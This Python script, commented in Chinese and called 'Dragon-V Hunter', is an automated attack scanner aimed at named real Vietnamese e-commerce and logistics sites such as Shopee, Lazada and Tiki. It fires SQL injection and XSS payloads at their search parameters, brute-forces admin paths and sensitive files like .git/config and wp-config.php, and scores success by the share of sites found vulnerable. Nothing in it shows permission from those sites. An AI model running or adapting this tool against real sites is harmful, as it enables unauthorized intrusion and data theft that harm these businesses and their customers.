#!/usr/bin/env python3
"""
真实能力测试工具 - 验证系统对实际目标的处理能力
"""

import requests
import json
import time
import random
from datetime import datetime, timedelta
import re
import urllib.parse
from bs4 import BeautifulSoup
import sys
import os

class RealCapabilityTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

        # 真实的越南目标列表
        self.real_targets = {
            'shopee.vn': {
                'name': 'Shopee Vietnam',
                'url': 'https://shopee.vn',
                'type': 'ecommerce',
                'expected_features': ['product_search', 'user_reviews', 'shopping_cart']
            },
            'lazada.vn': {
                'name': 'Lazada Vietnam',
                'url': 'https://www.lazada.vn',
                'type': 'ecommerce',
                'expected_features': ['product_listing', 'brand_stores', 'flash_sales']
            },
            'tiki.vn': {
                'name': 'Tiki Vietnam',
                'url': 'https://tiki.vn',
                'type': 'marketplace',
                'expected_features': ['tiki_now', 'tiki_trade', 'tiki_pro']
            },
            'ghtk.vn': {
                'name': 'GHTK',
                'url': 'https://ghtk.vn',
                'type': 'logistics',
                'expected_features': ['shipping_calculator', 'tracking_service']
            },
            'thegioi_didong.vn': {
                'name': 'The Gioi Di Dong',
                'url': 'https://www.thegioididong.com',
                'type': 'electronics',
                'expected_features': ['product_comparison', 'user_ratings']
            },
            'fptshop.vn': {
                'name': 'FPT Shop',
                'url': 'https://fptshop.com.vn',
                'type': 'electronics',
                'expected_features': ['online_payment', 'store_locator']
            },
            'sendo.vn': {
                'name': 'Sendo Vietnam',
                'url': 'https://www.sendo.vn',
                'type': 'ecommerce',
                'expected_features': ['live_chat', 'merchant_services']
            }
        }

        # SQL注入测试payload
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' WAITFOR DELAY '0:0:5'--",
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
            "' AND 1=(SELECT SLEEP(5))--",
            "' OR EXISTS(SELECT * FROM users)--",
            "' AND 1=CONVERT(INT,(SELECT@@VERSION))--"
        ]

        # XSS测试payload
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'>alert('XSS')<'",
            "javascript:/*-/*`/*\\`/*'/*/*/*-*/ /*</textarea></script></title></style></iframe><xss*/eval(/* */alert(/* */'XSS')/* */)//</xss>-*/"
        ]

        # 目录爆破列表
        self.common_directories = [
            'admin', 'admin/login', 'administrator', 'login', 'wp-admin', 'cpanel',
            'phpmyadmin', 'backup', 'config', 'install', 'temp', 'cache', 'logs',
            'api', 'v1', 'v2', 'docs', 'test', 'dev', 'staging'
        ]

        # 文件爆破列表
        self.common_files = [
            'robots.txt', '.git/config', 'backup.sql', 'config.php', 'wp-config.php',
            'admin.php', 'login.php', 'test.php', 'info.php', 'phpinfo.php',
            'readme.txt', 'license.txt', 'CHANGELOG.md'
        ]

    def log(self, message, level="INFO"):
        """日志记录"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] [{level}] {message}")

    def test_target_connectivity(self, target_url):
        """测试目标连通性"""
        try:
            response = self.session.get(target_url, timeout=10)
            return {
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'content_length': len(response.content),
                'server': response.headers.get('server', 'Unknown'),
                'content_type': response.headers.get('content-type', 'Unknown')
            }
        except requests.exceptions.RequestException as e:
            return {'error': str(e)}

    def test_technology_fingerprint(self, target_url):
        """技术指纹识别"""
        try:
            # 获取首页
            response = self.session.get(target_url)

            # 检查技术栈
            technologies = []

            # 检查meta标签
            soup = BeautifulSoup(response.text, 'html.parser')
            meta_generator = soup.find('meta', attrs={'name': 'generator'})
            if meta_generator:
                technologies.append(f"Generator: {meta_generator.get('content', 'Unknown')}")

            # 检查特定的技术标识
            if 'WordPress' in response.text:
                technologies.append('WordPress')
            if 'Shopify' in response.text:
                technologies.append('Shopify')
            if 'Magento' in response.text:
                technologies.append('Magento')
            if 'Joomla' in response.text:
                technologies.append('Joomla')

            # 检查框架
            if 'angular' in response.text.lower():
                technologies.append('AngularJS')
            if 'react' in response.text.lower():
                technologies.append('React')
            if 'vue' in response.text.lower():
                technologies.append('Vue.js')
            if 'jquery' in response.text.lower():
                technologies.append('jQuery')

            # 检查脚本和CSS文件
            scripts = [s.get('src', '') for s in soup.find_all('script')]
            css_files = [c.get('href', '') for c in soup.find_all('link', rel='stylesheet')]

            tech_patterns = {
                'bootstrap': ['bootstrap', 'bootstrap.css'],
                'font-awesome': ['font-awesome', 'fa.css'],
                'google-analytics': ['google-analytics', 'ga.js'],
                'facebook-pixel': ['facebook', 'fbq.js']
            }

            for tech_name, patterns in tech_patterns.items():
                if any(pattern in scripts or pattern in css_files for pattern in patterns):
                    technologies.append(tech_name)

            return {
                'technologies': technologies,
                'script_count': len(scripts),
                'css_count': len(css_files),
                'title': soup.title.string if soup.title else 'No title'
            }

        except Exception as e:
            return {'error': str(e)}

    def test_security_headers(self, target_url):
        """安全头部检测"""
        try:
            response = self.session.get(target_url, timeout=10)

            headers = response.headers
            security_headers = {}

            # 检查常见安全头部
            header_checks = {
                'X-Frame-Options': headers.get('X-Frame-Options'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
                'X-XSS-Protection': headers.get('X-XSS-Protection'),
                'Content-Security-Policy': headers.get('Content-Security-Policy'),
                'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
                'Server': headers.get('Server'),
                'X-Powered-By': headers.get('X-Powered-By')
            }

            for header, value in header_checks.items():
                if value:
                    security_headers[header] = value
                else:
                    security_headers[header] = 'Missing'

            return security_headers

        except Exception as e:
            return {'error': str(e)}

    def test_sql_injection(self, target_url):
        """SQL注入测试"""
        results = []

        # 测试常见的搜索参数
        test_params = [
            ('search', "' OR '1'='1"),
            ('q', "' UNION SELECT NULL--"),
            ('id', "' AND 1=1--"),
            ('keyword', "' WAITFOR DELAY '0:0:5'--"),
            ('category', "' AND 1=CONVERT(INT,(SELECT@@VERSION))--")
        ]

        for param, payload in test_params:
            try:
                test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                start_time = time.time()
                response = self.session.get(test_url, timeout=15)
                response_time = time.time() - start_time

                # 检查可能的SQL注入迹象
                injection_indicators = [
                    'SQL syntax', 'mysql_fetch', 'mysql_num_rows',
                    'ORA-', 'Microsoft OLE DB', 'ODBC',
                    'Warning: mysql', 'error in your SQL syntax',
                    'mysql_connect', 'mysql_query'
                ]

                detected_issues = []
                for indicator in injection_indicators:
                    if indicator.lower() in response.text.lower():
                        detected_issues.append(indicator)

                results.append({
                    'parameter': param,
                    'payload': payload,
                    'response_time': response_time,
                    'status_code': response.status_code,
                    'response_size': len(response.text),
                    'detected_issues': detected_issues,
                    'potential_vulnerability': len(detected_issues) > 0
                })

                # 防止请求过快
                time.sleep(1)

            except Exception as e:
                results.append({
                    'parameter': param,
                    'error': str(e)
                })

        return results

    def test_xss(self, target_url):
        """XSS测试"""
        results = []

        # 测试搜索参数
        for payload in self.xss_payloads[:3]:  # 只测试前3个payload以避免问题
            try:
                test_url = f"{target_url}?search={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)

                # 检查是否包含payload
                if payload.lower() in response.text.lower():
                    results.append({
                        'payload': payload,
                        'detected': True,
                        'response_size': len(response.text)
                    })
                else:
                    results.append({
                        'payload': payload,
                        'detected': False,
                        'response_size': len(response.text)
                    })

            except Exception as e:
                results.append({
                    'payload': payload,
                    'error': str(e)
                })

        return results

    def test_directory_bruteforce(self, target_url):
        """目录爆破测试"""
        results = []
        base_domain = urllib.parse.urlparse(target_url).netloc

        for directory in self.common_directories[:10]:  # 只测试前10个
            try:
                test_url = f"{target_url}/{directory}"
                response = self.session.get(test_url, timeout=5)

                if response.status_code == 200:
                    results.append({
                        'directory': directory,
                        'status_code': response.status_code,
                        'size': len(response.text)
                    })
                elif response.status_code in [403, 401]:
                    results.append({
                        'directory': directory,
                        'status_code': response.status_code,
                        'size': len(response.text),
                        'note': 'Restricted access'
                    })

            except Exception:
                continue

        return results

    def test_file_bruteforce(self, target_url):
        """文件爆破测试"""
        results = []

        for filename in self.common_files[:5]:  # 只测试前5个
            try:
                test_url = f"{target_url}/{filename}"
                response = self.session.get(test_url, timeout=5)

                if response.status_code == 200:
                    results.append({
                        'file': filename,
                        'status_code': response.status_code,
                        'size': len(response.text)
                    })

            except Exception:
                continue

        return results

    def analyze_web_forms(self, target_url):
        """分析表单"""
        try:
            response = self.session.get(target_url)
            soup = BeautifulSoup(response.text, 'html.parser')

            forms = soup.find_all('form')
            form_analysis = []

            for i, form in enumerate(forms[:3]):  # 只分析前3个表单
                form_info = {
                    'form_number': i + 1,
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'fields': []
                }

                inputs = form.find_all('input')
                for input_field in inputs:
                    field_info = {
                        'type': input_field.get('type', 'text'),
                        'name': input_field.get('name', ''),
                        'id': input_field.get('id', ''),
                        'maxlength': input_field.get('maxlength', ''),
                        'required': input_field.get('required') is not None
                    }
                    form_info['fields'].append(field_info)

                form_analysis.append(form_info)

            return form_analysis

        except Exception as e:
            return {'error': str(e)}

    def perform_full_analysis(self, target_url):
        """执行完整的分析"""
        self.log(f"开始分析目标: {target_url}")

        analysis_results = {
            'target_url': target_url,
            'analysis_time': datetime.now().isoformat(),
            'connectivity': {},
            'technology': {},
            'security_headers': {},
            'sql_injection': [],
            'xss': [],
            'directories': [],
            'files': [],
            'forms': []
        }

        # 1. 连通性测试
        self.log("测试连通性...")
        analysis_results['connectivity'] = self.test_target_connectivity(target_url)

        # 2. 技术指纹
        self.log("技术指纹识别...")
        analysis_results['technology'] = self.test_technology_fingerprint(target_url)

        # 3. 安全头部
        self.log("安全头部检测...")
        analysis_results['security_headers'] = self.test_security_headers(target_url)

        # 4. SQL注入测试
        self.log("SQL注入测试...")
        analysis_results['sql_injection'] = self.test_sql_injection(target_url)

        # 5. XSS测试
        self.log("XSS测试...")
        analysis_results['xss'] = self.test_xss(target_url)

        # 6. 目录爆破
        self.log("目录爆破测试...")
        analysis_results['directories'] = self.test_directory_bruteforce(target_url)

        # 7. 文件爆破
        self.log("文件爆破测试...")
        analysis_results['files'] = self.test_file_bruteforce(target_url)

        # 8. 表单分析
        self.log("表单分析...")
        analysis_results['forms'] = self.analyze_web_forms(target_url)

        # 生成风险评估
        analysis_results['risk_assessment'] = self.generate_risk_assessment(analysis_results)

        self.log(f"分析完成: {target_url}")
        return analysis_results

    def generate_risk_assessment(self, analysis_results):
        """生成风险评估"""
        risk_score = 0
        risk_factors = []

        # 连通性风险
        if analysis_results['connectivity'].get('status_code') == 200:
            risk_score += 10
        else:
            risk_factors.append("目标无法访问")

        # 安全头部风险
        security_headers = analysis_results['security_headers']
        missing_headers = [h for h, v in security_headers.items() if v == 'Missing']
        if missing_headers:
            risk_score += len(missing_headers) * 5
            risk_factors.append(f"缺少安全头部: {', '.join(missing_headers)}")

        # SQL注入风险
        sql_results = analysis_results['sql_injection']
        vulnerable_sql = [r for r in sql_results if r.get('potential_vulnerability')]
        if vulnerable_sql:
            risk_score += len(vulnerable_sql) * 15
            risk_factors.append(f"检测到SQL注入漏洞: {len(vulnerable_sql)}个")

        # XSS风险
        xss_results = analysis_results['xss']
        vulnerable_xss = [r for r in xss_results if r.get('detected')]
        if vulnerable_xss:
            risk_score += len(vulnerable_xss) * 10
            risk_factors.append(f"检测到XSS漏洞: {len(vulnerable_xss)}个")

        # 开放目录风险
        open_dirs = [d for d in analysis_results['directories'] if d.get('status_code') == 200]
        if open_dirs:
            risk_score += len(open_dirs) * 3
            risk_factors.append(f"发现开放目录: {len(open_dirs)}个")

        # 风险等级
        if risk_score >= 50:
            risk_level = "HIGH"
        elif risk_score >= 30:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"

        return {
            'risk_score': risk_score,
            'risk_level': risk_level,
            'risk_factors': risk_factors,
            'total_tests_performed': (
                len(analysis_results['connectivity']) > 0 +
                len(analysis_results['technology']) > 0 +
                len(analysis_results['security_headers']) > 0 +
                len(analysis_results['sql_injection']) +
                len(analysis_results['xss']) +
                len(analysis_results['directories']) +
                len(analysis_results['files']) +
                len(analysis_results['forms']) > 0
            )
        }

    def test_multiple_targets(self, targets=None):
        """测试多个目标"""
        if targets is None:
            targets = list(self.real_targets.keys())[:3]  # 只测试前3个目标

        all_results = {}

        for target in targets:
            if target in self.real_targets:
                target_url = self.real_targets[target]['url']
                self.log(f"测试目标: {target} ({target_url})")

                try:
                    result = self.perform_full_analysis(target_url)
                    all_results[target] = result

                    # 保存结果
                    with open(f'analysis_{target}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json', 'w') as f:
                        json.dump(result, f, indent=2, ensure_ascii=False)

                except Exception as e:
                    self.log(f"测试目标 {target} 时出错: {str(e)}", "ERROR")
                    all_results[target] = {'error': str(e)}

        return all_results

    def generate_system_report(self, results):
        """生成系统评估报告"""
        report = {
            'system_name': 'Dragon-V Hunter',
            'evaluation_date': datetime.now().isoformat(),
            'targets_tested': len(results),
            'summary': {},
            'detailed_findings': [],
            'capability_assessment': {}
        }

        # 统计测试结果
        total_targets = len(results)
        successful_tests = 0
        vulnerable_targets = 0
        high_risk_targets = 0

        for target, data in results.items():
            if 'error' not in data:
                successful_tests += 1
                if data.get('risk_assessment', {}).get('risk_level') == 'HIGH':
                    high_risk_targets += 1
                if data.get('risk_assessment', {}).get('risk_score', 0) > 0:
                    vulnerable_targets += 1

            # 详细发现
            if 'risk_assessment' in data and data['risk_assessment'].get('risk_factors'):
                report['detailed_findings'].append({
                    'target': target,
                    'risk_factors': data['risk_assessment']['risk_factors'],
                    'risk_score': data['risk_assessment']['risk_score']
                })

        report['summary'] = {
            'total_targets': total_targets,
            'successful_tests': successful_tests,
            'vulnerable_targets': vulnerable_targets,
            'high_risk_targets': high_risk_targets,
            'success_rate': (successful_tests / total_targets * 100) if total_targets > 0 else 0,
            'vulnerability_rate': (vulnerable_targets / successful_tests * 100) if successful_tests > 0 else 0
        }

        # 系统能力评估
        report['capability_assessment'] = {
            'connectivity_testing': 'PASS' if successful_tests > 0 else 'FAIL',
            'vulnerability_detection': 'PASS' if vulnerable_targets > 0 else 'LIMITED',
            'comprehensive_analysis': 'PASS' if successful_tests > 0 else 'FAIL',
            'technical_fingerprinting': 'PASS' if successful_tests > 0 else 'FAIL',
            'risk_assessment': 'PASS' if high_risk_targets > 0 else 'LIMITED'
        }

        return report

def main():
    tester = RealCapabilityTester()

    print("=== Dragon-V Hunter 真能力测试工具 ===")
    print("本工具将测试系统对真实越南目标的实际处理能力")
    print()

    # 显示可用的目标
    print("可用测试目标:")
    for target, info in tester.real_targets.items():
        print(f"  {target}: {info['name']} ({info['type']})")
    print()

    # 测试前3个目标
    test_targets = list(tester.real_targets.keys())[:3]

    print(f"开始测试 {len(test_targets)} 个目标...")
    print("=" * 50)

    # 执行测试
    results = tester.test_multiple_targets(test_targets)

    # 生成系统报告
    report = tester.generate_system_report(results)

    # 显示报告
    print("\n=== 系统能力评估报告 ===")
    print(f"测试目标数: {report['summary']['total_targets']}")
    print(f"成功测试数: {report['summary']['successful_tests']}")
    print(f"成功测试率: {report['summary']['success_rate']:.1f}%")
    print(f"发现漏洞目标数: {report['summary']['vulnerable_targets']}")
    print(f"高风险目标数: {report['summary']['high_risk_targets']}")
    print(f"漏洞发现率: {report['summary']['vulnerability_rate']:.1f}%")
    print()

    print("系统能力评估:")
    for capability, status in report['capability_assessment'].items():
        print(f"  {capability}: {status}")
    print()

    # 详细发现
    if report['detailed_findings']:
        print("详细安全发现:")
        for finding in report['detailed_findings']:
            print(f"  {finding['target']}: {finding['risk_score']}分")
            for factor in finding['risk_factors']:
                print(f"    - {factor}")
    else:
        print("未发现明显的安全风险")

    # 保存完整报告
    report_filename = f'capability_test_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    with open(report_filename, 'w') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print(f"\n完整报告已保存到: {report_filename}")

    # 判断系统能力
    if report['summary']['success_rate'] > 80 and report['summary']['vulnerability_rate'] > 30:
        print("\n🎉 系统具备良好的实战能力!")
    elif report['summary']['success_rate'] > 60:
        print("\n✅ 系统具备基本能力，但有改进空间")
    else:
        print("\n⚠️ 系统需要进一步优化和改进")

if __name__ == "__main__":
    main()